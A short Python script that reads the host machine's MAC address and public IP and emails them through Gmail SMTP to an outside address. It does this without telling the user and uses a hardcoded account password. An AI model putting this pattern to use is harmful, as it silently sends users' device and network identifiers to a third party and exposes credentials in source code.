import smtplib
import getmac
from publicip import get as getip

smtp = smtplib.SMTP('smtp.gmail.com', 587)
smtp.starttls()

smtp.login('testesrt123@gmail.com', 'Suporte@123')

mac = str(getmac.get_mac_address())
ip = getip()
de = 'testesrt123@gmail.com'
para = ['mrcutrim@gmail.com']
msg = """From: %s
To: %s
Subject: Buteco Open Source

Dados do Destinatario. 
Mac: %s IP: %s """ % (de, ', '.join(para),mac,ip)


smtp.sendmail(de, para, msg)

smtp.quit()